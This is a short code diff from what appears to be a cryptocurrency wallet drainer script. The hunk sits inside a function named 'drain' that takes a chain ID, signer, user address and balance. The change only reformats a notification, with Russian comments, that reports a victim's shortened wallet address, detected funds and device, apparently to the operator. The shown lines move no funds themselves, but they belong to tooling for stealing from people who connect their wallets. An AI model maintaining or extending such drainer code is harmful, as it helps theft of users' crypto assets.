@@ -562,7 +562,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
     // Формируем сообщение
     let fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
-    const message = `🌀 Connect | [ **\`${shortAddress}\`** ]\n\n` +
+    const message = `🌀 Connect | [${shortAddress}]\n\n` +
                     `Funds:\n` +
                     `${fundsMessage}\n` +
                     `Device: ${device}`;
